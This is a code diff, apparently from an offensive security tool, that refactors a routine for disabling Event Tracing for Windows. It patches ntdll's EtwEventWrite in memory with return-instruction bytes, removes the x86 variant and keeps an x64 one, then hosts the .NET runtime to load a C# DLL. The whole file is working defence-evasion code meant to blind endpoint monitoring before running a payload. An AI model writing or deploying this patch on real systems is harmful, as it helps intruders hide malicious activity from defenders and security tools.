@@ -3,26 +3,7 @@
 #include <metahost.h>
 #pragma comment(lib, "mscoree.lib")
 
-
-void disableETWx86() {
-
-    DWORD oldProt, oldOldProt;
-
-    //DISABLE ETW
-    // Get the EventWrite function
-    void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");
-
-    // Allow writing to page
-    VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);
-
-    // Patch with "ret 14" on x86
-    memcpy(eventWrite, "\xc2\x14\x00\x00", 4);
-
-    // Return memory to original protection
-    VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);
-}
-
-void disableETWx64() {
+void disableETW() {
 
     DWORD oldProt, oldOldProt;
 
@@ -33,8 +14,7 @@ void disableETWx64() {
     // Allow writing to page
     VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);
 
-    // Patch with "xor rax, rax; ret" on x86
-    // TODO: fake benign function return instead of direct return
+    // Patch with "xor rax, rax; ret"
     memcpy(eventWrite, "\x48\x33\xc0\xc3", 4);
 
     // Return memory to original protection
@@ -51,8 +31,7 @@ int main() {
     //Disable Event Tracing for Windows
     //This is a simple basic version that overwrites the library to directly return when EtwEventWrite is called
     //uncomment the correct target architecture
-    disableETWx86();
-    //disableETWx64();
+    disableETW();
     
     //Create CLR hosting interface and call C# DLL
     if (CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost) == S_OK)
